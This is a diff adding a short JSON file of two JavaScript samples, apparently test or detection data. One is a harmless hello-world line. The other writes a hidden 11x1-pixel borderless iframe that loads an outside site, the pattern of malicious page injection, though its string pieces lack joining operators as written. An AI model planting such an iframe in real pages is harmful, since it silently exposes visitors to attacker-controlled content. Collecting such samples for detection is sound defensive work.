@@ -1,0 +1,12 @@
+{
+	"javascript": [
+		{
+			"idx": "string1",
+			"code": "console.log('Hello World!');"
+		},
+		{
+			"idx": "string2",
+			"code": "document.write('<center>' '<iframe width=\"11\" height=\"1\" ' 'src=\"http://laghzesh.rzb.ir\" ' 'style=\"border: 0px;\" ' 'frameborder=\"0\" ' 'scrolling=\"auto\">' '</iframe>');"
+		}
+	]
+}
